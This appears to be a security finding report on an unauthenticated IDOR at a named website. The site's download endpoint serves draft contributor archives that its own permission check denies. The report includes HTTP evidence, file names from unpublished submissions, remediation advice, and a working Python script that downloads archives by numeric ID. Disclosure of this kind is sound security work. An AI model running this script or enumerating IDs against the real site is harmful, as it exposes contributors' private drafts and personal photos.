# Unauthenticated IDOR exposes draft contributor archives

**ID:** vuln-0003
**Severity:** MEDIUM
**Found:** 2026-09-04 07:54:59 UTC
**Target:** https://alfikr.id/
**Endpoint:** /tulisan/download/<pk>/
**Method:** GET
**CWE:** CWE-639
**CVSS:** 5.3
**Confidence:** High
**Fix Effort:** Medium

## Description

The contributor download endpoint returns private submission archives to anonymous callers without enforcing the draft-status authorization check used by its companion permission endpoint. An attacker can enumerate contributor IDs and retrieve unpublished DOCX submissions and uploaded photographs.

## Evidence

Anonymous requests produced the following responses:

```http
GET /tulisan/check-download/35/ HTTP/2

HTTP/2 403
content-type: application/json

{"status": false, "message": "Status tulisan masih draft."}
```

```http
GET /tulisan/download/35/ HTTP/2

HTTP/2 200
content-type: application/zip
content-disposition: attachment; filename="tulisan-35.zip"

[ZIP: Opini_Banjir_Jember.docx, foto-1.jpg]
```

```http
GET /tulisan/check-download/36/ HTTP/2

HTTP/2 403
content-type: application/json

{"status": false, "message": "Status tulisan masih draft."}
```

```http
GET /tulisan/download/36/ HTTP/2

HTTP/2 200
content-type: application/zip
content-disposition: attachment; filename="tulisan-36.zip"

[ZIP: Data_kosong_Kelompok_2.docx, foto-1.jpg]
```

## Impact

Unauthenticated internet users can download unpublished contributor materials, including document contents and photos, for records they do not own. The demonstrated archives contain draft submissions for contributor IDs `35` and `36`; the endpoint also returns a valid archive for ID `33`. This exposes private editorial content and associated personal data before review or publication.

## Counterevidence

The companion `check-download` endpoint correctly returns `403` for draft IDs, and the application may intend some contributor materials to be public after publication. However, direct anonymous downloads succeed despite the explicit draft denial, and the archive contents are unpublished DOCX and photo files; no authentication or authorization control was observed on the download response.

## What Would Change This Severity

Evidence that the downloaded archives contain only already-public content would lower confidentiality impact; confirmation that arbitrary IDs at scale expose all contributor submissions would raise the impact to high.

## Technical Analysis

The route `GET /tulisan/download/<pk>/` directly serves a ZIP archive keyed only by the attacker-controlled integer `pk`. No authentication, session, ownership check, or draft-status check is required. In contrast, `GET /tulisan/check-download/<pk>/` returns `403` with `Status tulisan masih draft.` for IDs `35` and `36`, demonstrating that the intended workflow recognizes those records as restricted but the download handler does not enforce the same control.

## Proof of Concept

1. Send an unauthenticated `GET` request to `/tulisan/check-download/35/` and observe the `403` response indicating the submission is still draft.
2. Without adding cookies, credentials, or CSRF tokens, send `GET /tulisan/download/35/`.
3. Save the response as a ZIP archive and inspect its entries; it contains `Opini_Banjir_Jember.docx` and `foto-1.jpg`.
4. Repeat with ID `36`; the response is also `200 OK` and contains `Data_kosong_Kelompok_2.docx` and `foto-1.jpg`.
5. Repeat with ID `33`; the permission endpoint returns `200`, while the direct download also returns the archive, confirming the same identifier controls access without an authorization gate.

```python
import io
import zipfile
import requests

base = "https://alfikr.id"
for contributor_id in (35, 36):
    permission = requests.get(
        f"{base}/tulisan/check-download/{contributor_id}/", timeout=20
    )
    download = requests.get(
        f"{base}/tulisan/download/{contributor_id}/", timeout=20
    )
    print(contributor_id, "permission:", permission.status_code, permission.text)
    print(contributor_id, "download:", download.status_code,
          download.headers.get("Content-Type"), len(download.content))
    archive = zipfile.ZipFile(io.BytesIO(download.content))
    print("entries:", archive.namelist())
```

## Remediation

Require authentication and object-level authorization in the download handler before opening or returning any contributor files. Reuse the same draft/review/published state policy as `check-download`, and bind the record to an authorized editorial role or owner rather than trusting the numeric path parameter. Return `403` for drafts and unauthorized principals, use non-guessable download references only as defense in depth, and add regression tests covering anonymous, non-owner, and authorized access to draft and published records.

## Assumptions

The archives represent contributor submissions intended to remain private while in draft status. Exploitation requires only network access; no account, victim interaction, or prior token is needed.
